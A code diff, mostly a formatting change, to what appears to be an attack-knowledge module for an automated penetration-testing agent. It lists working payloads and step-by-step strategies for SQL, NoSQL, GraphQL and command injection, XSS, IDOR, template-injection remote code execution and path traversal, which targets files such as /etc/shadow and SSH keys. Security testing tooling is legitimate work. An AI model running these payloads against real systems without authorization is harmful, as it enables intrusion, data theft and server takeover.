@@ -43,33 +43,40 @@ const AnalysisSchema = z.object({
 const ATTACK_KNOWLEDGE = {
   graphql_injection: {
     name: "GraphQL Injection",
-    description: "Exploits insufficient input validation in GraphQL queries to inject malicious queries/mutations",
-    objective: "Access unauthorized data, expose API structure, or execute unintended operations",
+    description:
+      "Exploits insufficient input validation in GraphQL queries to inject malicious queries/mutations",
+    objective:
+      "Access unauthorized data, expose API structure, or execute unintended operations",
     techniques: [
       {
         name: "Schema Introspection Injection",
         how: "Inject __schema queries to expose complete API structure",
-        context: "When GraphQL introspection is enabled and input isn't properly validated",
-        example: "Inject '} { __schema { types { name } } }' to break out and query schema"
+        context:
+          "When GraphQL introspection is enabled and input isn't properly validated",
+        example:
+          "Inject '} { __schema { types { name } } }' to break out and query schema",
       },
       {
         name: "Query Injection",
         how: "Break out of parameter context to inject unauthorized queries",
-        context: "When user input is embedded in queries without proper parameterization",
-        example: "Use '} { users { password email } }' to inject data-accessing queries"
+        context:
+          "When user input is embedded in queries without proper parameterization",
+        example:
+          "Use '} { users { password email } }' to inject data-accessing queries",
       },
       {
         name: "Mutation Injection",
         how: "Inject mutations to modify or delete data",
         context: "When mutations are accessible without authorization checks",
-        example: "Inject 'mutation { deleteUser(id: 1) }' or similar data-modifying operations"
+        example:
+          "Inject 'mutation { deleteUser(id: 1) }' or similar data-modifying operations",
       },
       {
         name: "Newline-based Injection",
         how: "Use newline characters to bypass basic input validation",
         context: "When basic string matching is used for filtering",
-        example: "Use '\n__schema' or '\n' + 'query' to bypass simple filters"
-      }
+        example: "Use '\n__schema' or '\n' + 'query' to bypass simple filters",
+      },
     ],
     indicators: {
       vulnerable: [
@@ -77,17 +84,18 @@ const ATTACK_KNOWLEDGE = {
         "Unauthorized query successfully executes",
         "Extra data fields that shouldn't be accessible",
         "Error messages revealing query structure or field names",
-        "Response contains data from injected query"
+        "Response contains data from injected query",
       ],
       notVulnerable: [
         "Input validation error (e.g., 'Invalid characters')",
         "Parameterized query protection (input treated as string literal)",
         "Proper escaping applied",
         "GraphQL syntax error from the server (query treated as data)",
-        "Authorization error (query parsed but blocked)"
-      ]
+        "Authorization error (query parsed but blocked)",
+      ],
     },
-    adaptiveStrategy: "Start with schema introspection to test if injection is possible. If successful, enumerate available fields. Then test for unauthorized data queries based on discovered schema. Try newline bypasses if basic tests fail."
+    adaptiveStrategy:
+      "Start with schema introspection to test if injection is possible. If successful, enumerate available fields. Then test for unauthorized data queries based on discovered schema. Try newline bypasses if basic tests fail.",
   },
 
   sql_injection: {
@@ -98,27 +106,30 @@ const ATTACK_KNOWLEDGE = {
       {
         name: "Boolean-based Blind",
         how: "Use boolean conditions to infer data through application behavior",
-        context: "When direct output isn't visible but application behavior changes",
-        example: "' OR '1'='1 makes condition always true, ' OR '1'='2 makes it false"
+        context:
+          "When direct output isn't visible but application behavior changes",
+        example:
+          "' OR '1'='1 makes condition always true, ' OR '1'='2 makes it false",
       },
       {
         name: "Union-based",
         how: "Use UNION to combine results from multiple queries",
         context: "When query results are displayed in the application",
-        example: "' UNION SELECT username,password FROM users-- to extract data"
+        example:
+          "' UNION SELECT username,password FROM users-- to extract data",
       },
       {
         name: "Time-based Blind",
         how: "Use database sleep functions to infer conditions",
         context: "When no visible output changes occur",
-        example: "' AND SLEEP(5)-- causes 5 second delay if vulnerable"
+        example: "' AND SLEEP(5)-- causes 5 second delay if vulnerable",
       },
       {
         name: "Error-based",
         how: "Trigger SQL errors to extract information",
         context: "When database errors are displayed",
-        example: "' to cause syntax error revealing database structure"
-      }
+        example: "' to cause syntax error revealing database structure",
+      },
     ],
     indicators: {
       vulnerable: [
@@ -127,41 +138,46 @@ const ATTACK_KNOWLEDGE = {
         "Authentication bypass (logged in without valid credentials)",
         "Time delays matching SLEEP commands",
         "Extra rows or columns in results",
-        "UNION query successful"
+        "UNION query successful",
       ],
       notVulnerable: [
         "Parameterized query protection (input treated as literal)",
         "Input rejected with validation error",
         "No behavioral changes with SQL metacharacters",
-        "WAF or input filter blocking"
-      ]
+        "WAF or input filter blocking",
+      ],
     },
-    adaptiveStrategy: "Start with single quote to test SQL context. If error, try boolean-based bypass. If successful, attempt UNION for data extraction. Fallback to time-based if no visible output."
+    adaptiveStrategy:
+      "Start with single quote to test SQL context. If error, try boolean-based bypass. If successful, attempt UNION for data extraction. Fallback to time-based if no visible output.",
   },
 
   nosql_injection: {
     name: "NoSQL Injection",
-    description: "Exploits insufficient input validation in NoSQL database queries (MongoDB, CouchDB, etc.)",
-    objective: "Bypass authentication, access unauthorized data, or modify database queries",
+    description:
+      "Exploits insufficient input validation in NoSQL database queries (MongoDB, CouchDB, etc.)",
+    objective:
+      "Bypass authentication, access unauthorized data, or modify database queries",
     techniques: [
       {
         name: "Operator Injection",
         how: "Inject NoSQL operators like $ne, $gt, $regex to manipulate queries",
         context: "When user input is directly used in NoSQL query objects",
-        example: '{"username": "admin", "password": {"$ne": ""}} bypasses authentication'
+        example:
+          '{"username": "admin", "password": {"$ne": ""}} bypasses authentication',
       },
       {
         name: "JavaScript Injection",
         how: "Inject JavaScript code in $where clauses",
         context: "When $where operator is used with user input",
-        example: '{"$where": "this.username == \'admin\' || 1==1"} to bypass logic'
+        example:
+          '{"$where": "this.username == \'admin\' || 1==1"} to bypass logic',
       },
       {
         name: "Array Injection",
         how: "Send arrays instead of strings to manipulate query logic",
         context: "When query parsers accept arrays as operator syntax",
-        example: "username=admin&password[$ne]=wrong as query parameters"
-      }
+        example: "username=admin&password[$ne]=wrong as query parameters",
+      },
     ],
     indicators: {
       vulnerable: [
@@ -169,16 +185,17 @@ const ATTACK_KNOWLEDGE = {
         "Unexpected data returned",
         "MongoDB/NoSQL error messages",
         "Successful $where clause execution",
-        "Query logic manipulation"
+        "Query logic manipulation",
       ],
       notVulnerable: [
         "Input type validation",
         "Operator filtering",
         "Parameterized queries",
-        "Strict schema validation"
-      ]
+        "Strict schema validation",
+      ],
     },
-    adaptiveStrategy: "Test operator injection first ($ne, $gt). If JSON POST, try object injection. For query parameters, try array notation. Check for JavaScript injection in $where if applicable."
+    adaptiveStrategy:
+      "Test operator injection first ($ne, $gt). If JSON POST, try object injection. For query parameters, try array notation. Check for JavaScript injection in $where if applicable.",
   },
 
   xss_reflected: {
@@ -190,77 +207,80 @@ const ATTACK_KNOWLEDGE = {
         name: "Basic Script Injection",
         how: "Inject <script> tags directly",
         context: "When output isn't HTML-escaped",
-        example: "<script>alert(1)</script>"
+        example: "<script>alert(1)</script>",
       },
       {
         name: "Event Handler Injection",
         how: "Use HTML event handlers like onerror, onload",
         context: "When <script> is filtered but other tags aren't",
-        example: "<img src=x onerror=alert(1)>"
+        example: "<img src=x onerror=alert(1)>",
       },
       {
         name: "Attribute Breakout",
         how: "Break out of HTML attributes to inject tags",
         context: "When input is reflected inside HTML attributes",
-        example: '"><script>alert(1)</script>'
-      }
+        example: '"><script>alert(1)</script>',
+      },
     ],
     indicators: {
       vulnerable: [
         "Script tags present in response HTML",
         "Event handlers in response",
         "JavaScript protocol in hrefs",
-        "Unescaped user input in HTML"
+        "Unescaped user input in HTML",
       ],
       notVulnerable: [
         "HTML entity encoding applied",
         "Content Security Policy blocking",
         "Input sanitization",
-        "Output escaping"
-      ]
+        "Output escaping",
+      ],
     },
-    adaptiveStrategy: "Try basic script tag first. If filtered, try event handlers. Check for attribute context. Test various encoding bypasses."
+    adaptiveStrategy:
+      "Try basic script tag first. If filtered, try event handlers. Check for attribute context. Test various encoding bypasses.",
   },
 
   command_injection: {
     name: "Command Injection",
-    description: "Executing arbitrary system commands through vulnerable application",
+    description:
+      "Executing arbitrary system commands through vulnerable application",
     objective: "Execute system commands on the server",
     techniques: [
       {
         name: "Command Chaining",
         how: "Use semicolon to chain commands",
         context: "When input is passed to system shell",
-        example: "; whoami or ; cat /etc/passwd"
+        example: "; whoami or ; cat /etc/passwd",
       },
       {
         name: "Pipe Injection",
         how: "Use pipe operator to redirect output",
         context: "When command output is processed",
-        example: "| whoami"
+        example: "| whoami",
       },
       {
         name: "Subshell Injection",
         how: "Use backticks or $() for command substitution",
         context: "When shell interprets special characters",
-        example: "`whoami` or $(cat /etc/passwd)"
-      }
+        example: "`whoami` or $(cat /etc/passwd)",
+      },
     ],
     indicators: {
       vulnerable: [
         "Command output in response",
         "System information leaked",
         "Delayed response from sleep commands",
-        "Error messages from system commands"
+        "Error messages from system commands",
       ],
       notVulnerable: [
         "Input sanitization",
         "Parameterized command execution",
         "Shell metacharacter filtering",
-        "Restricted execution environment"
-      ]
+        "Restricted execution environment",
+      ],
     },
-    adaptiveStrategy: "Test command chaining first. Try different separators (;, |, &). Use output detection commands like whoami, id. Fallback to time-based with sleep if no output visible."
+    adaptiveStrategy:
+      "Test command chaining first. Try different separators (;, |, &). Use output detection commands like whoami, id. Fallback to time-based with sleep if no output visible.",
   },
 
   idor: {
@@ -272,75 +292,80 @@ const ATTACK_KNOWLEDGE = {
         name: "Sequential ID Manipulation",
         how: "Change numeric IDs to access other resources",
         context: "When authorization isn't checked on ID-based endpoints",
-        example: "Change /user/123 to /user/124 to access other user's data"
+        example: "Change /user/123 to /user/124 to access other user's data",
       },
       {
         name: "UUID Enumeration",
         how: "Try predictable or enumerable UUIDs",
         context: "When UUIDs are sequential or guessable",
-        example: "Test sequential UUIDs or common patterns"
-      }
+        example: "Test sequential UUIDs or common patterns",
+      },
     ],
     indicators: {
       vulnerable: [
         "Different user's data returned",
         "Unauthorized resource access",
-        "No authorization check on resource access"
+        "No authorization check on resource access",
       ],
       notVulnerable: [
         "Authorization error (403 Forbidden)",
         "Not Found for unauthorized IDs",
-        "Proper access control checks"
-      ]
+        "Proper access control checks",
+      ],
     },
-    adaptiveStrategy: "Identify current user's ID, then test sequential IDs (±1, ±10). Check if different user data is returned. Test CRUD operations on other IDs."
+    adaptiveStrategy:
+      "Identify current user's ID, then test sequential IDs (±1, ±10). Check if different user data is returned. Test CRUD operations on other IDs.",
   },
 
   business_logic: {
     name: "Business Logic Vulnerabilities",
     description: "Exploiting flaws in application's business logic",
-    objective: "Manipulate prices, quantities, workflows, or bypass business rules",
+    objective:
+      "Manipulate prices, quantities, workflows, or bypass business rules",
     techniques: [
       {
         name: "Price Manipulation",
         how: "Modify price parameters to negative or zero",
         context: "When client-side price values are trusted",
-        example: "Set price=-100 or price=0.01"
+        example: "Set price=-100 or price=0.01",
       },
       {
         name: "Quantity Manipulation",
         how: "Use negative quantities or overflow values",
         context: "When quantity validation is insufficient",
-        example: "quantity=-1 or quantity=999999999"
+        example: "quantity=-1 or quantity=999999999",
       },
       {
         name: "Workflow Bypass",
         how: "Skip required steps in multi-step processes",
         context: "When step validation isn't enforced",
-        example: "Go directly to /checkout without /payment"
-      }
+        example: "Go directly to /checkout without /payment",
+      },
     ],
     indicators: {
       vulnerable: [
         "Negative prices accepted",
         "Zero-cost orders processed",
         "Steps can be skipped",
-        "Race conditions exploitable"
+        "Race conditions exploitable",
       ],
       notVulnerable: [
         "Server-side price validation",
         "Workflow state management",
-        "Proper business rule enforcement"
-      ]
+        "Proper business rule enforcement",
+      ],
     },
-    adaptiveStrategy: "Identify business-critical parameters. Test negative values, zero values, and overflows. Check workflow sequence enforcement."
+    adaptiveStrategy:
+      "Identify business-critical parameters. Test negative values, zero values, and overflows. Check workflow sequence enforcement.",
   },
 
   methodology: {
     systematic_discovery: {
       name: "Systematic Attack Surface Discovery",
-      description: "Complete attack surface mapping before vulnerability testing - professional pentesting methodology",
-      objective: "Discover ALL endpoints, parameters, forms, APIs before testing any vulnerabilities",
+      description:
+        "Complete attack surface mapping before vulnerability testing - professional pentesting methodology",
+      objective:
+        "Discover ALL endpoints, parameters, forms, APIs before testing any vulnerabilities",
 
       principle: "Test everything you find, find everything before testing",
 
@@ -352,9 +377,9 @@ const ATTACK_KNOWLEDGE = {
             "Enumerate all endpoints (don't test yet)",
             "Identify all parameters (don't test yet)",
             "Map all forms and inputs (don't test yet)",
-            "Document all APIs and versions (don't test yet)"
+            "Document all APIs and versions (don't test yet)",
           ],
-          completion_criteria: "No new endpoints discovered for 3+ attempts"
+          completion_criteria: "No new endpoints discovered for 3+ attempts",
         },
         {
           phase: "Testing Phase",
@@ -363,9 +388,10 @@ const ATTACK_KNOWLEDGE = {
             "Test each endpoint against relevant vulnerability classes",
             "Test each parameter with appropriate payloads",
             "Record ALL results (vulnerable AND safe)",
-            "Use test_parameter for systematic testing"
+            "Use test_parameter for systematic testing",
           ],
-          completion_criteria: "All discovered elements have test results recorded"
+          completion_criteria:
+            "All discovered elements have test results recorded",
         },
         {
           phase: "Validation Phase",
@@ -374,10 +400,10 @@ const ATTACK_KNOWLEDGE = {
             "Check coverage: Tested X/X endpoints?",
             "Check coverage: Tested Y/Y parameters?",
             "Investigated all errors/anomalies?",
-            "Would professional pentester consider this complete?"
+            "Would professional pentester consider this complete?",
           ],
-          completion_criteria: "check_testing_coverage shows >90% coverage"
-        }
+          completion_criteria: "check_testing_coverage shows >90% coverage",
+        },
       ],
 
       discovery_strategies: {
@@ -389,10 +415,10 @@ const ATTACK_KNOWLEDGE = {
             "3. Test common paths: /admin, /api, /login, /user, /settings",
             "4. Extract endpoints from JavaScript files",
             "5. Try HTTP methods: GET, POST, PUT, DELETE, OPTIONS",
-            "6. Don't stop until no new endpoints found"
+            "6. Don't stop until no new endpoints found",
           ],
           tools: ["enumerate_endpoints", "curl", "grep", "JavaScript analysis"],
-          validation: "Can you find any endpoint you haven't documented?"
+          validation: "Can you find any endpoint you haven't documented?",
         },
 
         parameter_identification: {
@@ -402,9 +428,10 @@ const ATTACK_KNOWLEDGE = {
             "2. Identify all parameters in request body",
             "3. Identify hidden form fields",
             "4. Check for parameters in headers (cookies, custom headers)",
-            "5. Review JavaScript for API calls with parameters"
+            "5. Review JavaScript for API calls with parameters",
           ],
-          validation: "Did you document every way to send data to this endpoint?"
+          validation:
+            "Did you document every way to send data to this endpoint?",
         },
 
         error_investigation: {
@@ -413,18 +440,18 @@ const ATTACK_KNOWLEDGE = {
             "404: Try trailing slash, different methods, with parameters",
             "500: Check Docker logs, look for stack traces, try parameters",
             "403: Try auth bypass, parameter manipulation, different methods",
-            "400: Try different content types, check required parameters"
+            "400: Try different content types, check required parameters",
           ],
           principle: "Every response is data - investigate everything",
-          validation: "Did I understand WHY this endpoint behaved this way?"
-        }
+          validation: "Did I understand WHY this endpoint behaved this way?",
+        },
       },
 
       completeness_checks: [
         "Have I discovered all endpoints? (Try 10+ more patterns - anything new?)",
         "Have I tested all discovered endpoints? (Check coverage report)",
         "Have I investigated all anomalies? (Any unexplained 404/500?)",
-        "Would I stake my reputation this is complete? (Professional standard)"
+        "Would I stake my reputation this is complete? (Professional standard)",
       ],
 
       anti_patterns: [
@@ -432,7 +459,7 @@ const ATTACK_KNOWLEDGE = {
         "❌ Get 404 → Assume doesn't exist → Skip",
         "❌ Find one vuln → Report → Done",
         "❌ Test 5 endpoints → Claim 'comprehensive assessment'",
-        "✅ Discover ALL → Test ALL → Validate coverage → Report"
+        "✅ Discover ALL → Test ALL → Validate coverage → Report",
       ],
 
       indicators: {
@@ -441,25 +468,28 @@ const ATTACK_KNOWLEDGE = {
           "Complete endpoint list before testing",
           "All parameters identified per endpoint",
           "Coverage validation before reporting",
-          "All errors investigated, not skipped"
+          "All errors investigated, not skipped",
         ],
         opportunistic_approach: [
           "Testing started without full discovery",
           "Endpoints tested as found (no complete list)",
           "Errors skipped without investigation",
           "Report generated without coverage check",
-          "Premature conclusion of testing"
-        ]
+          "Premature conclusion of testing",
+        ],
       },
 
-      adaptiveStrategy: "Phase 1: Enumerate until no new findings (3+ attempts). Phase 2: Test all discovered elements systematically. Phase 3: Validate >90% coverage before reporting. Never test before discovery is complete. Never report before validation is complete."
-    }
+      adaptiveStrategy:
+        "Phase 1: Enumerate until no new findings (3+ attempts). Phase 2: Test all discovered elements systematically. Phase 3: Validate >90% coverage before reporting. Never test before discovery is complete. Never report before validation is complete.",
+    },
   },
 
   ssti: {
     name: "Server-Side Template Injection (SSTI)",
-    description: "Exploits unsafe template rendering where user input is embedded in templates without sanitization",
-    objective: "Execute arbitrary code on server, access sensitive configuration, achieve RCE",
+    description:
+      "Exploits unsafe template rendering where user input is embedded in templates without sanitization",
+    objective:
+      "Execute arbitrary code on server, access sensitive configuration, achieve RCE",
 
     templateEngines: {
       jinja2: {
@@ -469,7 +499,12 @@ const ATTACK_KNOWLEDGE = {
         configAccess: "{{config}}",
         classExploration: "{{''.__class__.__mro__[1].__subclasses__()}}",
         rce: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
-        indicators: ["49 in response", "Configuration object visible", "Class listings", "Command output"]
+        indicators: [
+          "49 in response",
+          "Configuration object visible",
+          "Class listings",
+          "Command output",
+        ],
       },
       twig: {
         framework: "PHP (Symfony)",
@@ -477,7 +512,11 @@ const ATTACK_KNOWLEDGE = {
         testPayload: "{{7*7}}",
         configAccess: "{{_self.env}}",
         rce: "{{['id']|map('system')|join}}",
-        indicators: ["49 in response", "Environment object", "System command output"]
+        indicators: [
+          "49 in response",
+          "Environment object",
+          "System command output",
+        ],
       },
       smarty: {
         framework: "PHP",
@@ -485,7 +524,7 @@ const ATTACK_KNOWLEDGE = {
         testPayload: "{7*7}",
         rce: "{system('id')}",
         phpExec: "{php}echo `id`;{/php}",
-        indicators: ["49 in response", "Command output", "PHP execution"]
+        indicators: ["49 in response", "Command output", "PHP execution"],
       },
       freemarker: {
         framework: "Java",
@@ -493,7 +532,11 @@ const ATTACK_KNOWLEDGE = {
         testPayload: "${7*7}",
         classAccess: "${product.getClass()}",
         rce: "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}",
-        indicators: ["49 in response", "Java class names visible", "Command output"]
+        indicators: [
+          "49 in response",
+          "Java class names visible",
+          "Command output",
+        ],
       },
       erb: {
         framework: "Ruby (Rails)",
@@ -502,8 +545,13 @@ const ATTACK_KNOWLEDGE = {
         rce: "<%= system('id') %>",
         fileRead: "<%= File.read('/etc/passwd') %>",
         dirList: "<%= Dir.entries('/') %>",
-        indicators: ["49 in response", "System output", "File contents", "Directory listings"]
-      }
+        indicators: [
+          "49 in response",
+          "System output",
+          "File contents",
+          "Directory listings",
+        ],
+      },
     },
 
     techniques: [
@@ -513,7 +561,8 @@ const ATTACK_KNOWLEDGE = {
         context: "First step - determines if template injection is possible",
         payloads: ["{{7*7}}", "${7*7}", "{7*7}", "<%= 7*7 %>"],
         successIndicator: "Response contains '49'",
-        example: "Test {{7*7}} in name parameter - if response shows '49', SSTI confirmed"
+        example:
+          "Test {{7*7}} in name parameter - if response shows '49', SSTI confirmed",
       },
       {
         name: "Config/Environment Access",
@@ -522,33 +571,36 @@ const ATTACK_KNOWLEDGE = {
         payloads: {
           jinja2: "{{config}}",
           twig: "{{_self.env}}",
-          freemarker: "${.data_model}"
+          freemarker: "${.data_model}",
         },
-        example: "{{config}} in Jinja2 exposes Flask application configuration"
+        example: "{{config}} in Jinja2 exposes Flask application configuration",
       },
       {
         name: "RCE via Template Functions",
         how: "Use template built-in functions to execute system commands",
         context: "Final escalation to remote code execution",
         payloads: {
-          jinja2: "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
+          jinja2:
+            "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
           twig: "{{['whoami']|map('system')|join}}",
           smarty: "{system('whoami')}",
-          freemarker: "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('whoami')}",
-          erb: "<%= system('whoami') %>"
+          freemarker:
+            "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('whoami')}",
+          erb: "<%= system('whoami') %>",
         },
-        example: "Jinja2 RCE through config object and os module access"
+        example: "Jinja2 RCE through config object and os module access",
       },
       {
         name: "Blind SSTI - Time-Based",
         how: "Use sleep/delay functions when no visible output",
         context: "When template output isn't directly visible",
         payloads: {
-          jinja2: "{{''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True)}}",
-          php: "{{system('sleep 5')}}"
+          jinja2:
+            "{{''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True)}}",
+          php: "{{system('sleep 5')}}",
         },
         successIndicator: "Response delayed by 5+ seconds",
-        example: "Inject sleep command and measure response time"
+        example: "Inject sleep command and measure response time",
       },
       {
         name: "Blind SSTI - Error-Based",
@@ -556,7 +608,7 @@ const ATTACK_KNOWLEDGE = {
         context: "When no output reflection but errors visible",
         payloads: ["{{invalid_syntax}}", "${undefined_var}", "{malformed"],
         successIndicator: "Template engine error message in response",
-        example: "{{invalid}} triggers 'TemplateSyntaxError' revealing Jinja2"
+        example: "{{invalid}} triggers 'TemplateSyntaxError' revealing Jinja2",
       },
       {
         name: "Multi-Step Form SSTI",
@@ -565,10 +617,11 @@ const ATTACK_KNOWLEDGE = {
         workflow: [
           "1. Submit {{7*7}} in registration step 1 'name' field",
           "2. Continue through step 2",
-          "3. Check step 3 greeting - if shows 'Welcome, 49!' → SSTI confirmed"
+          "3. Check step 3 greeting - if shows 'Welcome, 49!' → SSTI confirmed",
         ],
-        example: "Name from step1 rendered in step3 confirmation without sanitization"
-      }
+        example:
+          "Name from step1 rendered in step3 confirmation without sanitization",
+      },
     ],
 
     testingWorkflow: [
@@ -581,16 +634,35 @@ const ATTACK_KNOWLEDGE = {
       "7. If blind: use time-based (sleep commands) or error-based detection",
       "8. Once confirmed, escalate to config access",
       "9. Finally attempt RCE with engine-specific payloads",
-      "10. Create POC demonstrating code execution"
+      "10. Create POC demonstrating code execution",
     ],
 
     highRiskParameters: [
-      "name", "username", "firstname", "lastname", "displayname",
-      "title", "subject", "heading",
-      "message", "comment", "feedback", "description", "bio",
-      "template", "theme", "layout", "view",
-      "email", "email_body", "email_subject",
-      "content", "body", "text", "note", "memo"
+      "name",
+      "username",
+      "firstname",
+      "lastname",
+      "displayname",
+      "title",
+      "subject",
+      "heading",
+      "message",
+      "comment",
+      "feedback",
+      "description",
+      "bio",
+      "template",
+      "theme",
+      "layout",
+      "view",
+      "email",
+      "email_body",
+      "email_subject",
+      "content",
+      "body",
+      "text",
+      "note",
+      "memo",
     ],
 
     highRiskContexts: [
@@ -602,7 +674,7 @@ const ATTACK_KNOWLEDGE = {
       "Admin panels (custom messages, labels, notification templates)",
       "Blog/CMS systems (post titles, author names, custom templates)",
       "Search result pages (search query reflected in results page)",
-      "User-generated content displays (bios, signatures, profile descriptions)"
+      "User-generated content displays (bios, signatures, profile descriptions)",
     ],
 
     indicators: {
@@ -615,7 +687,7 @@ const ATTACK_KNOWLEDGE = {
         "Time delays matching sleep commands (blind detection)",
         "Environment variables or config exposed",
         "File contents readable via template functions",
-        "Template engine name in error messages (Jinja2, Twig, etc.)"
+        "Template engine name in error messages (Jinja2, Twig, etc.)",
       ],
       notVulnerable: [
         "Template syntax treated as literal string ('{{7*7}}' displayed as-is)",
@@ -625,8 +697,8 @@ const ATTACK_KNOWLEDGE = {
         "No template evaluation of user input",
         "Parameterized templates with proper separation",
         "Input validation blocking template syntax",
-        "WAF or filter blocking template payloads"
-      ]
+        "WAF or filter blocking template payloads",
+      ],
     },
 
     adaptiveStrategy: `
@@ -664,19 +736,45 @@ CRITICAL: Test ALL input fields, especially those rendered in:
 - Admin notifications (New user {{name}} registered)
 
 Don't just test obvious fields - templates can be anywhere user input is rendered!
-    `
+    `,
   },
 
   path_traversal: {
     name: "Path Traversal / Local File Inclusion (LFI)",
-    description: "Exploits insufficient input validation in file path operations to read arbitrary files",
-    objective: "Read sensitive files (/etc/passwd, config files, source code, credentials)",
+    description:
+      "Exploits insufficient input validation in file path operations to read arbitrary files",
+    objective:
+      "Read sensitive files (/etc/passwd, config files, source code, credentials)",
 
     parameterPatterns: [
-      "file", "path", "document", "doc", "page", "template", "resource",
-      "pdf", "include", "load", "read", "download", "view", "display",
-      "filename", "filepath", "location", "dir", "folder", "directory",
-      "source", "src", "url", "uri", "get", "fetch", "show", "open"
+      "file",
+      "path",
+      "document",
+      "doc",
+      "page",
+      "template",
+      "resource",
+      "pdf",
+      "include",
+      "load",
+      "read",
+      "download",
+      "view",
+      "display",
+      "filename",
+      "filepath",
+      "location",
+      "dir",
+      "folder",
+      "directory",
+      "source",
+      "src",
+      "url",
+      "uri",
+      "get",
+      "fetch",
+      "show",
+      "open",
     ],
 
     techniques: [
@@ -688,9 +786,9 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
           "../../../etc/passwd",
           "../../../../etc/passwd",
           "../../../../../etc/passwd",
-          "../../../../../../etc/passwd"
+          "../../../../../../etc/passwd",
         ],
-        example: "../../../etc/passwd accesses /etc/passwd from 3 levels deep"
+        example: "../../../etc/passwd accesses /etc/passwd from 3 levels deep",
       },
       {
         name: "URL Encoding Bypass",
@@ -698,9 +796,9 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
         context: "When basic traversal blocked by string matching",
         payloads: [
           "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-          "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"
+          "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
         ],
-        example: "%2e%2e%2f bypasses filters that only check for literal '../'"
+        example: "%2e%2e%2f bypasses filters that only check for literal '../'",
       },
       {
         name: "Double Encoding Bypass",
@@ -708,9 +806,9 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
         context: "When single encoding blocked",
         payloads: [
           "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
-          "%252e%252e%255c%252e%252e%255cwindows%255cwin.ini"
+          "%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
         ],
-        example: "%252e = encoded '%2e' which decodes to '.'"
+        example: "%252e = encoded '%2e' which decodes to '.'",
       },
       {
         name: "Null Byte Injection",
@@ -719,9 +817,9 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
         payloads: [
           "../../../etc/passwd%00",
           "../../../etc/passwd%00.pdf",
-          "../../../etc/passwd%00.txt"
+          "../../../etc/passwd%00.txt",
         ],
-        example: "../../../etc/passwd%00.pdf - null byte truncates .pdf"
+        example: "../../../etc/passwd%00.pdf - null byte truncates .pdf",
       },
       {
         name: "Absolute Path Access",
@@ -731,9 +829,9 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
           "/etc/passwd",
           "/etc/shadow",
           "C:\\windows\\win.ini",
-          "/var/www/html/config.php"
+          "/var/www/html/config.php",
         ],
-        example: "/etc/passwd directly accesses absolute path"
+        example: "/etc/passwd directly accesses absolute path",
       },
       {
         name: "Windows Path Separators",
@@ -742,9 +840,9 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
         payloads: [
           "..\\..\\..\\windows\\win.ini",
           "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-          "C:\\windows\\win.ini"
+          "C:\\windows\\win.ini",
         ],
-        example: "..\\\\..\\\\ uses Windows path separators"
+        example: "..\\\\..\\\\ uses Windows path separators",
       },
       {
         name: "Protocol Wrappers (PHP)",
@@ -755,9 +853,9 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
           "file:///etc/passwd",
           "php://filter/resource=/etc/passwd",
           "expect://id",
-          "data://text/plain;base64,SSBsb3ZlIFBIUAo="
+          "data://text/plain;base64,SSBsb3ZlIFBIUAo=",
         ],
-        example: "php://filter/convert.base64-encode reveals source code"
+        example: "php://filter/convert.base64-encode reveals source code",
       },
       {
         name: "Mixed Encoding",
@@ -766,10 +864,10 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
         payloads: [
           "..%2F..%2F../etc/passwd",
           "%2e%2e/..%2F../etc/passwd",
-          "..\\%2F..%5c../etc/passwd"
+          "..\\%2F..%5c../etc/passwd",
         ],
-        example: "Mix literal and encoded characters to bypass regex"
-      }
+        example: "Mix literal and encoded characters to bypass regex",
+      },
     ],
 
     targetFiles: {
@@ -784,7 +882,7 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
         "/var/log/nginx/access.log",
         "/home/user/.ssh/id_rsa",
         "/root/.bash_history",
-        "/var/www/html/config.php"
+        "/var/www/html/config.php",
       ],
       windows: [
         "C:\\windows\\win.ini",
@@ -792,7 +890,7 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
         "C:\\boot.ini",
         "C:\\inetpub\\wwwroot\\web.config",
         "C:\\xampp\\apache\\conf\\httpd.conf",
-        "C:\\windows\\system.ini"
+        "C:\\windows\\system.ini",
       ],
       application: [
         "config.php",
@@ -806,8 +904,8 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
         "wp-config.php",
         ".git/config",
         "composer.json",
-        "package.json"
-      ]
+        "package.json",
+      ],
     },
 
     testingWorkflow: [
@@ -821,7 +919,7 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
       "8. Test both / and \\\\ path separators",
       "9. For PHP: try protocol wrappers (file://, php://filter/)",
       "10. Target high-value files: /etc/passwd, config files, .env",
-      "11. Test every file parameter found, not just the obvious ones"
+      "11. Test every file parameter found, not just the obvious ones",
     ],
 
     indicators: {
@@ -835,7 +933,7 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
         "Base64 encoded file contents (PHP filter wrapper)",
         "Environment variables from /proc/self/environ",
         "SSH keys or credentials in response",
-        "Stack traces showing file system structure"
+        "Stack traces showing file system structure",
       ],
       notVulnerable: [
         "Input validation error ('Invalid characters detected')",
@@ -844,8 +942,8 @@ Don't just test obvious fields - templates can be anywhere user input is rendere
         "File not found after trying all bypasses",
         "Access denied errors (but endpoint exists)",
         "Whitelist validation blocking traversal",
-        "Empty response for all traversal attempts"
-      ]
+        "Empty response for all traversal attempts",
+      ],
     },
 
     adaptiveStrategy: `
@@ -871,13 +969,15 @@ CRITICAL: Test ALL parameters that might handle files:
 - Obvious: file, path, document, page
